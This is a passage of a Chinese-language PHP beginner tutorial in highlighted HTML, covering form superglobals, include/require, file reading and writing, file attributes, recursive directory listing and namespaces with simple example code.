class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$_REQUEST</span>);</span><br></pre></td></tr></table></figure><p>在地址栏后面输入<code>?name=Qeminco</code>提交一个get表单，被获取到。</p><p><img src="/img/print_r_$3.png"></p><p>获取post表单。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;input name=<span class="string">&quot;uaername&quot;</span> type=<span class="string">&quot;text&quot;</span>/&gt;</span><br><span class="line">    &lt;input value=<span class="string">&quot;sub&quot;</span> type=<span class="string">&quot;submit&quot;</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$_REQUEST</span>);</span><br></pre></td></tr></table></figure><p><strong>$_POST</strong> ：广泛应用于收集表单数据，在HTML form标签的指定该属性：”method&#x3D;”post”。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;input name=<span class="string">&quot;uaername&quot;</span> type=<span class="string">&quot;text&quot;</span>/&gt;</span><br><span class="line">    &lt;input value=<span class="string">&quot;sub&quot;</span> type=<span class="string">&quot;submit&quot;</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$_POST</span>);</span><br></pre></td></tr></table></figure><p><strong>$_GET</strong> ：广泛应用于收集表单数据，在HTML form标签的指定该属性：”method&#x3D;”get”。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">    &lt;input name=<span class="string">&quot;uaername&quot;</span> type=<span class="string">&quot;text&quot;</span>/&gt;</span><br><span class="line">    &lt;input value=<span class="string">&quot;sub&quot;</span> type=<span class="string">&quot;submit&quot;</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$_GET</span>);</span><br></pre></td></tr></table></figure><p><strong>$_FILES</strong> ：文件上传。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input name=<span class="string">&quot;file&quot;</span> type=<span class="string">&quot;file&quot;</span>/&gt;</span><br><span class="line">    &lt;input value=<span class="string">&quot;sub&quot;</span> type=<span class="string">&quot;submit&quot;</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$_FILES</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>$_ENV</strong> ：</p><p><strong>$_COOKIE</strong> ：</p><p><strong>$_SESSION</strong> ：</p><h1 id="10-PHP-包含文件"><a href="#10-PHP-包含文件" class="headerlink" title="10 PHP 包含文件"></a>10 PHP 包含文件</h1><p>服务器端包含 (SSI) 用于创建可在多个页面重复使用的函数、页眉、页脚或元素。</p><p>include （或 require）语句会获取指定文件中存在的所有文本&#x2F;代码&#x2F;标记，并复制到使用 include 语句的文件中。</p><p>包含文件很有用，如果您需要在网站的多张页面上引用相同的 PHP、HTML 或文本的话。</p><p><strong>include 和 require 语句</strong></p><p>通过 include 或 require 语句，可以将 PHP 文件的内容插入另一个 PHP 文件（在服务器执行它之前）。</p><p>include 和 require 语句是相同的，除了错误处理方面：</p><p>require 会生成致命错误（E_COMPILE_ERROR）并停止脚本，</p><p>include 只生成警告（E_WARNING），并且脚本会继续。</p><p>因此，如果您希望继续执行，并向用户输出结果，即使包含文件已丢失，那么请使用 include。否则，在框架、CMS 或者复杂的 PHP 应用程序编程中，请始终使用 require 向执行流引用关键文件。这有助于提高应用程序的安全性和完整性，在某个关键文件意外丢失的情况下。</p><p>包含文件省去了大量的工作。这意味着您可以为所有页面创建标准页头、页脚或者菜单文件。然后，在页头需要更新时，您只需更新这个页头包含文件即可。</p><p>语法：</p><p><code>include &#39;filename&#39;;</code> </p><p>或</p><p><code>require &#39;filename&#39;;</code> </p><p>如果有一个名为 function.php 的文件，内容如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;fun1&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 function.php 的同级目录中有 index.php 文件如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>;  <span class="comment">//把另一个文件包含进来</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">fun1</span>();  <span class="comment">//调用包含文件中的函数</span></span><br></pre></td></tr></table></figure><h1 id="11-PHP-文件处理"><a href="#11-PHP-文件处理" class="headerlink" title="11 PHP 文件处理"></a>11 PHP 文件处理</h1><h2 id="11-1-readfile-函数"><a href="#11-1-readfile-函数" class="headerlink" title="11.1 readfile()函数"></a>11.1 readfile()函数</h2><p><code>readfile()</code>  函数读取文件，并把它写入输出缓冲。</p><p>如读取成功则 readfile() 函数返回文本内容和字节数。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;123.txt&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="11-2-文件操作"><a href="#11-2-文件操作" class="headerlink" title="11.2 文件操作"></a>11.2 文件操作</h2><h3 id="11-2-1-打开文件"><a href="#11-2-1-打开文件" class="headerlink" title="11.2.1 打开文件"></a>11.2.1 打开文件</h3><p><code>fopen()</code> 函数提供了比 readfile() 函数更多的选项。</p><p>fopen() 的第一个参数包含被打开的文件名，第二个参数规定打开文件的模式。</p><p><img src="/img/202206070715231.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//如果 fopen() 函数未能打开指定的文件，则输出 Unable to open file!</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;123.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$myfile</span>,<span class="title function_ invoke__">filesize</span>(<span class="string">&quot;123.txt&quot;</span>));</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="11-2-3-读取文件"><a href="#11-2-3-读取文件" class="headerlink" title="11.2.3 读取文件"></a>11.2.3 读取文件</h3><p><code>fread()</code> 函数读取打开的文件。</p><p>fread() 的第一个参数包含待读取文件的文件名，第二个参数规定待读取的最大字节数。</p><p>如下 PHP 代码把 “123.txt” 文件读至结尾：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;123.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">fread</span>(<span class="variable">$myfile</span>,<span class="title function_ invoke__">filesize</span>(<span class="string">&quot;123.txt&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="11-2-3关闭文件"><a href="#11-2-3关闭文件" class="headerlink" title="11.2.3关闭文件"></a>11.2.3关闭文件</h3><p><code>fclose()</code> 函数用于关闭打开的文件。</p><p>用完文件后把它们全部关闭是一个良好的编程习惯。您并不想打开的文件占用您的服务器资源。</p><p>fclose() 需要待关闭文件的名称（或者存有文件名的变量）。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;123.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// some code to be executed....</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="11-2-4-遍历文件"><a href="#11-2-4-遍历文件" class="headerlink" title="11.2.4 遍历文件"></a>11.2.4 遍历文件</h3><p><code>fgets()</code> 函数用于从文件读取单行。</p><p>调用 fgets() 函数之后，文件指针会移动到下一行。</p><p>下例输出 “123.txt” 文件的首行：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;123.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>feof()</code> 函数检查是否已到达 “end-of-file” (EOF)文件末尾。</p><p>feof() 对于遍历未知长度的数据很有用。</p><p>下例逐行读取 “123.txt” 文件，直到 end-of-file：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;123.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="comment">// 输出单行直到 end-of-file</span></span><br><span class="line"><span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$myfile</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$myfile</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  &#125;  </span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>fgetc()</code> 函数用于从文件中读取单个字符。</p><p>在调用 fgetc() 函数之后，文件指针会移动到下一个字符。</p><p>下例逐字符读取 “123.txt” 文件，直到 end-of-file：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;123.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="comment">// 输出单行直到 end-of-file</span></span><br><span class="line"><span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$myfile</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">fgetc</span>(<span class="variable">$myfile</span>);</span><br><span class="line">  &#125;  </span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="11-2-5-创建文件"><a href="#11-2-5-创建文件" class="headerlink" title="11.2.5 创建文件"></a>11.2.5 创建文件</h3><p><code>fopen()</code> 函数也用于创建文件。也许有点混乱，但是在 PHP 中，创建文件所用的函数与打开文件的相同。</p><p>如果用 fopen() 打开并不存在的文件，此函数会创建文件，假定文件被打开为写入（w）或增加（a）。</p><p>下面的例子创建名为 “testfile.txt” 的新文件。此文件将被创建于 PHP 代码所在的相同目录中：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;testfile.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="11-2-6-写入文件"><a href="#11-2-6-写入文件" class="headerlink" title="11.2.6 写入文件"></a>11.2.6 写入文件</h3><p>fwrite() 函数用于写入文件。</p><p>fwrite() 的第一个参数包含要写入的文件的文件名，第二个参数是被写的字符串。</p><p>下面的例子把姓名写入名为 “newfile.txt” 的新文件中：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;newfile.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&quot;萧炎\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&quot;叶凡\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>文件覆盖（Overwriting）</strong></p><p>现在 “newfile.txt” 包含了一些数据，当我们再次以w模式打开文件并写入时，会清除已有的数据并写入新数据。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;newfile.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&quot;张三\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&quot;李四\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果现在我们打开这个 “newfile.txt” 文件，萧炎和叶凡都已消失，只剩下我们刚写入的数据张三和李四。</p><h2 id="11-3-文件复制-删除-重命名"><a href="#11-3-文件复制-删除-重命名" class="headerlink" title="11.3 文件复制&#x2F;删除&#x2F;重命名"></a>11.3 文件复制&#x2F;删除&#x2F;重命名</h2><p><code>rename(旧名,新名)</code> 函数重命名文件。</p><p><code>copy(要复制的文件,复制文件的目的地)</code> 函数复制文件。</p><p><code>unlink(要删除的文件)</code> 函数删除文件。</p><h2 id="11-4-文件的判断"><a href="#11-4-文件的判断" class="headerlink" title="11.4 文件的判断"></a>11.4 文件的判断</h2><p><code>file_exists(文件路径)</code> 函数检查文件或目录是否存在。</p><p><code>is_file(要检查的文件)</code> 函数检查指定的文件是否是常规的文件。</p><h1 id="12-PHP获取文件属性"><a href="#12-PHP获取文件属性" class="headerlink" title="12 PHP获取文件属性"></a>12 PHP获取文件属性</h1><p>当我们在程序中操作文件时，可能会使用到文件的一些常见属性，比如文件的大小、类型、修改时间、访问时间以及权限等等。PHP 中提供了非常全面的用来获取这些属性的内置函数，如下表所示。</p><p><img src="/img/202206070711892.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;test.txt&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;文件不存在，程序退出！&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&#x27; 文件大小是：&#x27;</span>.<span class="title function_ invoke__">filesize</span>(<span class="variable">$file</span>).<span class="string">&#x27; 个字节&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_readable</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&#x27; 文件是可读的。&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&#x27; 文件是不可读的。&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_writable</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&#x27; 文件是可写的。&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&#x27; 文件是不可写的。&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_executable</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&#x27; 文件是可执行的。&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&#x27; 文件是不可执行的。&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;文件的创建时间是：&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>,<span class="title function_ invoke__">filectime</span>(<span class="variable">$file</span>)).<span class="string">&#x27;。&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;文件的修改时间是：&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>,<span class="title function_ invoke__">filemtime</span>(<span class="variable">$file</span>)).<span class="string">&#x27;。&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;文件上次的访问时间是：&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>,<span class="title function_ invoke__">fileatime</span>(<span class="variable">$file</span>)).<span class="string">&#x27;。&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="13-PHP目录操作"><a href="#13-PHP目录操作" class="headerlink" title="13 PHP目录操作"></a>13 PHP目录操作</h1><p>新建目录：<code>mkdir(路径，权限，递归创建)</code> </p><p>删除目录：<code>rmdir()</code> </p><p>移动（重命名）目录：<code>rename(旧名,新名)</code> </p><p>打开目录：<code>目录句柄 = opendir()</code> </p><p>读取目录 ：<code>文件名 = readdir(目录句柄)</code> </p><p>依次读取文件名，同时向下移动文件句柄指针，读取不到则返回false。</p><p>关闭目录：<code>closedir()</code> </p><p>当前目录：<code>./</code> </p><p>上级目录：<code>../</code> </p><p>递归读取目录内容：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//递归遍历目录</span></span><br><span class="line"><span class="variable">$dirfile</span>=<span class="string">&quot;c:/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tree</span>(<span class="params"><span class="variable">$dirfile</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$dir</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$dirfile</span>);</span><br><span class="line">    <span class="keyword">while</span> ((<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$dir</span>)) !== <span class="literal">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_dir</span>(<span class="string">&quot;<span class="subst">$dirfile</span><span class="subst">&#123;$file&#125;</span>&quot;</span>) &amp;&amp; (<span class="variable">$file</span> !=<span class="string">&quot;.&quot;</span>) &amp;&amp; (<span class="variable">$file</span> !=<span class="string">&quot;..&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_readable</span>(<span class="string">&quot;<span class="subst">$dirfile</span><span class="subst">&#123;$file&#125;</span>&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;目录 <span class="subst">$dirfile</span><span class="subst">&#123;$file&#125;</span> &lt;/br&gt;&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">tree</span>(<span class="string">&quot;<span class="subst">$dirfile</span><span class="subst">&#123;$file&#125;</span>&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;目录 <span class="subst">$dirfile</span><span class="subst">&#123;$file&#125;</span> 不可访问&lt;/br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>( (<span class="variable">$file</span> !=<span class="string">&quot;.&quot;</span>) &amp;&amp; (<span class="variable">$file</span> !=<span class="string">&quot;..&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;文件 <span class="subst">$dirfile</span>/<span class="subst">&#123;$file&#125;</span> &lt;/br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">tree</span>(<span class="variable">$dirfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="14-命名空间"><a href="#14-命名空间" class="headerlink" title="14 命名空间"></a>14 命名空间</h1><p><strong>PHP</strong> <strong>命名空间可以解决以下两类问题：</strong> </p><p>1.用户编写的代码与PHP内部的类&#x2F;函数&#x2F;常量或第三方类&#x2F;函数&#x2F;常量之间的名字冲突。</p><p>2.为很长的标识符名称(通常是为了缓解第一类问题而定义的)创建一个别名（或简短）的名称，以提高源代码的可读性。</p><p><strong>命名空间（可以理解为创建文件夹）</strong></p><p>定义：命名空间namespace，是指人为的将内存进行分隔，让不同内存区域的同名结构共存，从而解决在大型项目中可能出现的重名结构的问题。</p><p>语法：namespace 空间名</p><p>作用：不同的空间可以有同名的结构，如：类</p><p>空间元素：函数，常量，类，不包括变量！！</p><p><strong>子空间（子文件夹）</strong> </p><p>定义：命名空间内部再划分一个命名空间，让每个小空间独立起来。</p><p>语法:</p><ul><li>namespace 空间名</li><li>namespace 空间名\子空间</li></ul><p>命名空间.php文件内容如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">mydemo</span>; <span class="comment">//空间名为mydemo</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;子空间.php&#x27;</span>; <span class="comment">//导入子空间</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">NAME</span>=<span class="string">&quot;Qeminco_a&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;getName_a&lt;/br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Dog_a&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> NAME; <span class="comment">//非限定名称，本空间名访问</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">getName</span>(); <span class="comment">//非限定名称，本空间名访问</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title class_">Dog</span>::<span class="title function_ invoke__">run</span>(); <span class="comment">//非限定名称，本空间名访问</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> b\NAME; <span class="comment">//限定名称访问子空间中的元素</span></span><br><span class="line"><span class="keyword">echo</span> b\<span class="title function_ invoke__">getName</span>(); <span class="comment">//限定名称访问子空间中的元素</span></span><br><span class="line"><span class="keyword">echo</span> b<span class="title class_">\Dog</span>::<span class="title function_ invoke__">run</span>(); <span class="comment">//限定名称访问子空间中的元素</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> \mydemo\NAME; <span class="comment">//完全限定名称</span></span><br><span class="line"><span class="keyword">echo</span> \mydemo\<span class="title function_ invoke__">getName</span>(); <span class="comment">//完全限定名称</span></span><br><span class="line"><span class="keyword">echo</span> \mydemo<span class="title class_">\Dog</span>::<span class="title function_ invoke__">run</span>(); <span class="comment">//完全限定名称</span></span><br></pre></td></tr></table></figure><p>子空间.php内容如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">mydemo</span>\<span class="title class_">b</span>; <span class="comment">//子空间为mydemo下的b空间</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">NAME</span>=<span class="string">&quot;Qeminco_b&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;getName_b&lt;/br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Dog_b&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>命名空间访问 （url）</strong> </p><p><strong>非限定名称访问</strong>：直接访问空间元素的名字（只访问自己命名空间的元素）。</p><p><strong>限定名称访问</strong>：使用自己当前的子空间名字+ \ + 元素名字。</p><p><strong>完全限定名称访问</strong>：\ + 全局空间 + \ + 元素名字。</p><p>注：任何空间元素访问，只针对函数，类，常量。</p><p><strong>全局空间（C盘）</strong> </p><p>如果定义了命名空间，非限定名称的寻找系统常量的方式：</p><p>首先：在自己的空间内找。</p><p>然后：如果找不到元素。</p><p>​    系统常量–&gt;进入全局空间寻找。</p><p>​    系统类 –&gt; 不会自动进入全局空间寻找，而是会报错。</p><p><strong>命名空间的引入</strong> </p><p>1.空间引入方式：use关键字</p><ul><li>引入类：use 空间名\类名</li><li>引入函数：use function 空间名\函数名</li><li>引入常量：use const 空间名\常量名</li></ul><p>2.当引入元素时重名，通过 as 来起别名</p><ul><li>use 空间名\类名 as 别名</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">one</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;子空间.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">mydemo</span>\<span class="title">b</span> <span class="keyword">as</span> <span class="title">aa</span>;</span><br><span class="line"><span class="keyword">echo</span> aa\NAME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">mydemo</span>\<span class="title">b</span>\<span class="title">Dog</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="keyword">const</span> <span class="title">mydemo</span>\<span class="title">b</span>\<span class="title">NAME</span>;</span><br><span class="line"><span class="keyword">echo</span> NAME;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="keyword">function</span> <span class="title">mydemo</span>\<span class="title">b</span>\<span class="title">getName</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">getName</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> \mydemo\b\<span class="title function_ invoke__">Dog</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>-&gt;<span class="title function_ 